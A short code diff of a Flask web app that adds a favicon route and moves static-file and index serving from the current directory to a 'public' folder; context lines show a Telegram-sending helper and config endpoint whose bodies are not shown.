@@ -547,13 +547,17 @@ def send_to_telegram(account_data, filename, original_content=""):
         logger.error(f"Error sending to Telegram: {str(e)}")
         return False
 
+@app.route('/favicon.ico')
+def serve_favicon():
+    return send_from_directory('public', 'favicon.ico', mimetype='image/vnd.microsoft.icon')
+
 @app.route('/')
 def serve_index():
-    return send_from_directory('.', 'index.html')
+    return send_from_directory('public', 'index.html')
 
 @app.route('/<path:path>')
 def serve_static(path):
-    return send_from_directory('.', path)
+    return send_from_directory('public', path)
 
 @app.route('/api/telegram-config', methods=['POST'])
 def set_telegram_config():
